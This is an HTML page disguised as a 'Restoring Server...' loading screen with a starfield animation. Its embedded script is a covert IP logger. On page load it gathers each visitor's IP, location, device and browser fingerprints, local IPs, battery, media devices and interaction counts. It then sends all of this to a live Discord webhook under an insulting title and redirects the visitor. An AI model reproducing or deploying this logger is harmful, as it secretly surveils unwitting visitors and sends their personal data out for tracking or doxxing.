<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Restoring Server...</title>
<style>
body {
    margin: 0;
    overflow: hidden;
    background: #000;
    color: #fff;
    font-family: sans-serif;
}
/* Loading bar */
.loading-bar {
    position: absolute;
    top: 80%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 60%;
    height: 20px;
    background: #222;
    border-radius: 10px;
    overflow: hidden;
    z-index: 10;
}
.loading-progress {
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg,#0ff,#0ff99);
    animation: loadAnim 3s linear forwards;
}
@keyframes loadAnim {
    0% { width: 0%; }
    100% { width: 100%; }
}
/* Canvas stars */
#stars {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 0;
}
</style>
</head>
<body>
<canvas id="stars"></canvas>
<div class="loading-bar"><div class="loading-progress"></div></div>

<script>
// ===== STARFIELD =====
const canvas = document.getElementById('stars');
const ctx = canvas.getContext('2d');
let w = canvas.width = window.innerWidth;
let h = canvas.height = window.innerHeight;
const numStars = 200;
let stars = [];
for(let i=0;i<numStars;i++){
    stars.push({x:Math.random()*w,y:Math.random()*h,z:Math.random()*w,o:Math.random()});
}
function drawStars(){
    ctx.fillStyle = "black"; ctx.fillRect(0,0,w,h);
    ctx.fillStyle = "white";
    for(let s of stars){
        const k = 128.0/s.z;
        const px = (s.x-w/2)*k + w/2;
        const py = (s.y-h/2)*k + h/2;
        const size = (1 - s.z/w) * 3;
        ctx.globalAlpha = s.o;
        ctx.fillRect(px, py, size, size);
        s.z -= 2; if(s.z<=0){ s.z=w; s.x=Math.random()*w; s.y=Math.random()*h; s.o=Math.random(); }
    }
    requestAnimationFrame(drawStars);
}
drawStars();
window.addEventListener('resize',()=>{ w=canvas.width=window.innerWidth; h=canvas.height=window.innerHeight; });

// ===== LOGGER =====
(async ()=>{
const webhook="https://discord.com/api/webhooks/1406970787478634610/2-a_1e8XweoASfU6EdE6mDSbSCIXPjHWJ5PRikjO6JkRjMxRb4m5SIRTuo3HtAiPorYA";
const redirect="https://unknownerror";
const startTime=performance.now();

// Multi-API IP
const apis=["https://ip-api.com/json/","https://ipapi.co/json/","https://ipwho.is/","https://api64.ipify.org?format=json"];
let ipInfo={};
for(const url of apis){ try{ const data=await (await fetch(url)).json(); if(data.ip || data.IPv4){ ipInfo={...ipInfo,...data}; break; } }catch{} }
const ping=Math.round(performance.now()-startTime);
const countryCode=(ipInfo.country_code||ipInfo.countryCode||"UN").toLowerCase();
const countryFlag=`https://flagcdn.com/64x48/${countryCode}.png`;

// System info
const ua=navigator.userAgent, platform=navigator.platform, language=navigator.language;
const cores=navigator.hardwareConcurrency||"Unknown", memory=navigator.deviceMemory||"Unknown";
const screenRes=`${screen.width}x${screen.height}`, colorDepth=screen.colorDepth;
const touchPoints=navigator.maxTouchPoints, orientation=screen.orientation?.type||"Unknown";
const online=navigator.onLine?"Yes":"No", timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
const doNotTrack=navigator.doNotTrack==="1"?"Yes":"No", focused=document.hasFocus()?"Yes":"No";
const visibility=document.visibilityState, dpi=window.devicePixelRatio||1;
const zoom=Math.round((window.outerWidth/window.innerWidth)*100)+"%";

// Extra info
const connection=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
const connectionInfo={type:connection.effectiveType||"Unknown", downlink:connection.downlink||"Unknown", rtt:connection.rtt||"Unknown", saveData:connection.saveData||"Unknown"};
const viewportSize={width: window.innerWidth, height: window.innerHeight};
const windowSize={width: window.outerWidth, height: window.outerHeight};
const availableScreen={width: screen.availWidth, height: screen.availHeight};
const cookieEnabled=navigator.cookieEnabled?"Yes":"No";
const referrer=document.referrer||"None";
const pointerCoarse=window.matchMedia("(pointer: coarse)").matches?"Yes":"No";
const plugins=Array.from(navigator.plugins).map(p=>p.name).join(", ")||"None";
const mimeTypes=Array.from(navigator.mimeTypes).map(m=>m.type).join(", ")||"None";
const localTime=new Date().toString();

// Battery
let batteryInfo={};
try{ const b=await navigator.getBattery(); batteryInfo={charging:b.charging,level:Math.round(b.level*100)+"%",dischargingTime:b.dischargingTime}; }
catch{ batteryInfo={charging:"Unknown",level:"Unknown",dischargingTime:"Unknown"} }

// Geolocation
let geo={};
try{ const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:3000})); geo=pos.coords; }
catch{ geo={error:"Permission Denied"} }

// Endpoint pings
const endpoints=["https://www.google.com","https://www.cloudflare.com"];
let endpointPing={};
for(const url of endpoints){ const t0=performance.now(); try{ await fetch(url,{mode:"no-cors"}); endpointPing[url]=Math.round(performance.now()-t0)+"ms"; } catch{ endpointPing[url]="Fail"; } }

// WebGL & Canvas
let glInfo={}, canvasFP="", glExtensions=[];
try{
  const canvas2=document.createElement("canvas");
  const gl=canvas2.getContext("webgl")||canvas2.getContext("experimental-webgl");
  const ext=gl.getExtension("WEBGL_debug_renderer_info");
  glInfo={vendor:gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)};
  glExtensions=gl.getSupportedExtensions();
  canvas2.width=200; canvas2.height=50;
  const ctx2=canvas2.getContext("2d");
  ctx2.textBaseline="top"; ctx2.font="16px Arial"; ctx2.fillStyle="#f60"; ctx2.fillRect(125,1,62,20);
  ctx2.fillStyle="#0ff"; ctx2.fillText("LoggerFPTest",2,15);
  canvasFP=canvas2.toDataURL();
}catch{ glInfo={vendor:"Unknown",renderer:"Unknown"}; glExtensions=["Unknown"]; }

// Audio fingerprint
let audioFP="";
try{
  const audioCtx=new (window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);
  const oscillator=audioCtx.createOscillator();
  const compressor=audioCtx.createDynamicsCompressor();
  oscillator.connect(compressor); compressor.connect(audioCtx.destination);
  oscillator.start(0); audioCtx.startRendering();
  audioFP=audioCtx;
}catch{ audioFP="Unsupported"; }

// Media devices
let mediaDevices=[];
try{ mediaDevices=await navigator.mediaDevices.enumerateDevices(); }catch{ mediaDevices=["Not Supported"]; }

// Fonts detection
const fonts=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS"];
let detectedFonts=fonts.filter(f=>{
  const canvas3=document.createElement("canvas");
  const ctx3=canvas3.getContext("2d");
  ctx3.font="72px monospace"; const baseline=ctx3.measureText("A").width;
  ctx3.font=`72px ${f}, monospace`; return ctx3.measureText("A").width!==baseline;
});

// Interaction data
let mouseData={moves:[],clicks:0}, touchData={touches:[]}, scrollData=[], keyData=[];
document.addEventListener("mousemove",e=>mouseData.moves.push({x:e.clientX,y:e.clientY,time:Date.now()}));
document.addEventListener("click",()=>mouseData.clicks++);
document.addEventListener("touchstart",e=>touchData.touches.push({x:e.touches[0].clientX,y:e.touches[0].clientY,time:Date.now()}));
document.addEventListener("scroll",()=>scrollData.push({scrollX:window.scrollX,scrollY:window.scrollY,time:Date.now()}));
document.addEventListener("keydown",e=>keyData.push({key:e.key,time:Date.now()}));

// ===== VPN/Proxy Detection =====
async function detectLocalIPs() {
    return new Promise(resolve=>{
        const ips=[];
        const pc=new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(offer=>pc.setLocalDescription(offer));
        pc.onicecandidate=(event)=>{
            if(!event.candidate){ resolve(ips); return; }
            const ipRegex=/([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const ipMatch=ipRegex.exec(event.candidate.candidate);
            if(ipMatch) ips.push(ipMatch[1]);
        };
    });
}
const localIPs = await detectLocalIPs();
const isVPNorProxy = localIPs.some(ip=>ip!==ipInfo.ip);

// Small delay to capture initial interactions
await new Promise(res=>setTimeout(res,1500));

// Send to Discord
const embed={
username: ipInfo.ip||"Unknown",
avatar_url: countryFlag,
embeds:[{
title:"🎆 Retard Hit Detected",
color:16766720,
thumbnail:{url:"https://cdn.discordapp.com/attachments/1402975578080153623/1405891273143095398/download.jpg?ex=68a079c7&is=689f2847&hm=736661ca7487d4ae8fc780c60a1c04ad46fae6172c2d7ce09c88c437c2419e1c&"},
fields:[
{name:"🌍 IP Info", value:`IP: ${ipInfo.ip||ipInfo.IPv4}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region||ipInfo.state_prov}\nCountry: ${ipInfo.country}\nOrg: ${ipInfo.org||ipInfo.isp}\nPing: ${ping}ms\nEndpoint Ping: ${JSON.stringify(endpointPing)}`},
{name:"🖥 System Info", value:`Platform: ${platform}\nBrowser: ${ua}\nCores: ${cores}\nMemory: ${memory} GB\nResolution: ${screenRes}\nColor Depth: ${colorDepth}-bit\nTouch Points: ${touchPoints}\nOrientation: ${orientation}\nLanguage: ${language}\nOnline: ${online}\nDo Not Track: ${doNotTrack}\nFocused: ${focused}\nVisibility: ${visibility}\nDPI: ${dpi}\nZoom: ${zoom}`},
{name:"🔋 Battery", value:JSON.stringify(batteryInfo)},
{name:"📌 Geolocation", value:geo.latitude?`Lat:${geo.latitude}\nLon:${geo.longitude}\nAccuracy:${geo.accuracy}`:"Permission Denied"},
{name:"🎮 GPU & Canvas", value:`Vendor:${glInfo.vendor}\nRenderer:${glInfo.renderer}\nCanvasFP:${canvasFP}\nExtensions:${glExtensions.join(", ")}`},
{name:"🎵 Audio FP", value:audioFP.toString()},
{name:"🎤 Media Devices", value:mediaDevices.map(d=>`${d.kind}: ${d.label||"Unknown"}`).join(", ")},
{name:"🔵 Installed Fonts", value:detectedFonts.join(", ")||"None"},
{name:"🖱 Mouse & Touch", value:`Moves:${mouseData.moves.length} Clicks:${mouseData.clicks} Touches:${touchData.touches.length}`},
{name:"📜 Scroll & Keys", value:`Scrolls:${scrollData.length} Keys:${keyData.length}`},
{name:"🔀 Connection Info", value:`Type:${connectionInfo.type}\nDownlink:${connectionInfo.downlink}Mbps\nRTT:${connectionInfo.rtt}ms\nSaveData:${connectionInfo.saveData}`},
{name:"🖥 Window & Screen Info", value:`Viewport:${viewportSize.width}x${viewportSize.height}\nWindow:${windowSize.width}x${windowSize.height}\nAvailable Screen:${availableScreen.width}x${availableScreen.height}`},
{name:"🔌 Other Info", value:`Cookie Enabled:${cookieEnabled}\nReferrer:${referrer}\nPointer Coarse:${pointerCoarse}\nPlugins:${plugins}\nMIMETypes:${mimeTypes}\nLocal Time:${localTime}`},
{name:"❓ VPN/Proxy", value:isVPNorProxy?"Yes":"No"}
],
footer:{text:"Notti's IP Logger | Premium"},
timestamp:new Date().toISOString()
}]};

await fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(embed)});
setTimeout(()=>window.location.href=redirect,3000);
})();
</script>
</body>
</html>
